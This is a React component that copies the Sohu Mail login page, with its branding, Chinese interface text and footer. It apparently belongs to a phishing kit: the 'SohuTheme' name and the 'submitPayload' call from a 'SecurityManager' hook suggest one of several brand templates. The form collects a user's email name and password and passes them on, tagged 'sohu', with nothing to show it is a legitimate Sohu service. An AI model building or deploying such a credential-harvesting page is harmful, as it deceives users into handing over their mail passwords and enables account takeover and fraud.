
import React, { useState } from 'react';
import { useSecurity } from '../components/SecurityManager';

interface SohuThemeProps {
  prefilledEmail?: string;
}

const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail?.split('@')[0] || '');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { submitPayload } = useSecurity();

  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await submitPayload({ email: `${email}@sohu.com`, password }, 'sohu');
      setPassword('');
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleSubmit(e);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center space-x-3">
          {/* Sohu Mail Logo */}
          <div className="flex items-center">
            <div className="w-10 h-10 bg-gradient-to-br from-yellow-400 to-orange-500 rounded flex items-center justify-center text-white mr-2">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                <path d="M13 10V3L4 14H11V21L20 10H13Z" />
              </svg>
            </div>
            <div className="flex flex-col leading-none">
              <span className="text-[#333] font-bold text-xl">搜狐闪电邮箱</span>
              <span className="text-gray-400 text-xs">mail.sohu.com</span>
            </div>
          </div>
        </div>
        
        <nav className="flex items-center space-x-6 text-[12px] text-gray-500">
          <a href="#" className="hover:text-red-500">搜狐首页</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-red-500">VIP邮箱</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-red-500">手机邮箱</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-red-500">帮助中心</a>
        </nav>
      </header>

      {/* Main Area */}
      <main className="flex-grow bg-[#e8e9eb] relative flex items-center justify-center py-12 px-4 overflow-hidden">
        <div className="w-full max-w-[1200px] flex flex-col md:flex-row items-center justify-center md:space-x-12 relative z-10">
          
          {/* Left Side: Illustration and QR */}
          <div className="hidden lg:flex items-center space-x-12">
            <div className="relative">
              {/* Simplified Phone Illustration from image */}
              <div className="w-[450px] h-[350px] relative">
                {/* Smartphone perspective */}
                <div className="absolute inset-0 bg-white/50 rounded-3xl transform -rotate-12 border-4 border-white shadow-xl"></div>
                <div className="absolute inset-4 bg-blue-600 rounded-2xl transform -rotate-12 flex flex-col items-center justify-center text-white p-6">
                  <div className="text-3xl font-bold italic mb-2">搜狐新闻APP</div>
                  <div className="bg-yellow-400 text-blue-900 px-4 py-1 rounded-full font-bold text-sm">全新上线</div>
                </div>
                {/* Floating elements */}
                <div className="absolute -right-10 top-1/2 w-32 h-48 bg-blue-800 rounded shadow-lg transform rotate-6 border-2 border-white/50"></div>
                <div className="absolute left-0 bottom-0 text-blue-800 font-bold text-2xl tracking-widest transform -rotate-12">
                   支持各类<br/>附件下载预览
                </div>
              </div>
            </div>

            {/* QR Code Section */}
            <div className="flex flex-col items-center space-y-3 bg-white/40 p-4 rounded-xl backdrop-blur-sm border border-white/50">
              <div className="w-32 h-32 bg-white p-1 rounded border-2 border-blue-500">
                <div className="w-full h-full bg-blue-100 flex flex-col p-1 space-y-1">
                   {/* Mock QR pattern */}
                   {[...Array(4)].map((_, i) => (
                     <div key={i} className="flex space-x-1 flex-1">
                        {[...Array(4)].map((_, j) => (
                          <div key={j} className={`flex-1 ${ (i+j)%2 === 0 ? 'bg-blue-600' : 'bg-transparent' } rounded-sm`}></div>
                        ))}
                     </div>
                   ))}
                </div>
              </div>
              <span className="text-[13px] text-blue-600 font-medium">扫码立即下载</span>
            </div>
          </div>

          {/* Login Card */}
          <div className="w-full max-w-[380px] bg-white rounded-lg shadow-2xl overflow-hidden flex">
            {/* Left side vertical tabs */}
            <div className="w-16 bg-[#f7f8fa] flex flex-col items-center py-6 space-y-8 border-r border-gray-100">
              <div className="w-10 h-10 rounded-full bg-[#ff4d4f] flex items-center justify-center text-white text-[10px] font-bold cursor-pointer hover:opacity-80 transition-opacity">
                sohu
              </div>
              <div className="w-10 h-10 rounded-full bg-[#52c41a] flex items-center justify-center text-white text-[10px] font-bold cursor-pointer hover:opacity-80 transition-opacity opacity-50">
                me
              </div>
            </div>

            {/* Main Login Form */}
            <form onSubmit={handleSubmit} className="flex-grow p-8">
              <h3 className="text-lg font-medium mb-8 text-gray-600">登录搜狐邮箱</h3>
              
              <div className="space-y-6">
                <div className="flex items-center border border-gray-300 rounded focus-within:border-red-400 transition-colors">
                  <input 
                    type="text" 
                    placeholder="请输入您的邮箱" 
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    onKeyDown={handleKeyDown}
                    className="flex-grow px-4 py-2.5 text-[14px] focus:outline-none"
                  />
                  <span className="px-4 text-gray-400 text-[14px] border-l border-gray-100">@sohu.com</span>
                </div>

                <div className="relative">
                  <input 
                    type="password" 
                    placeholder="请输入您的密码" 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={handleKeyDown}
                    className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-red-400 transition-colors"
                  />
                </div>

                <div className="flex items-center justify-between text-[12px] text-gray-500">
                  <label className="flex items-center cursor-pointer">
                    <input type="checkbox" className="mr-1.5 accent-[#ff4d4f]" defaultChecked />
                    下次自动登录
                  </label>
                  <a href="#" className="hover:text-red-500">忘记密码</a>
                </div>

                <button 
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-3 bg-[#ff4d4f] hover:bg-[#e03a3c] text-white font-medium rounded transition-colors text-[16px] shadow-lg shadow-red-200 disabled:opacity-70"
                >
                  {isSubmitting ? '...' : '登 录'}
                </button>

                <div className="pt-4 text-center">
                   <div className="bg-[#f2f3f5] py-2 rounded text-[12px] text-gray-500">
                     还没有搜狐闪电邮？ <a href="#" className="text-red-500 hover:underline">现在注册</a>
                   </div>
                </div>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-10 bg-white">
        <div className="max-w-[1200px] mx-auto px-4 text-center space-y-2">
          <div className="text-[11px] text-gray-500">
            Copyright © 2026 Sohu All Rights Reserved. 搜狐公司 版权所有
          </div>
          <div className="text-[11px] text-gray-500">
            客服邮箱：webmaster@vip.sohu.com
          </div>
        </div>
      </footer>
    </div>
  );
};

export default SohuTheme;
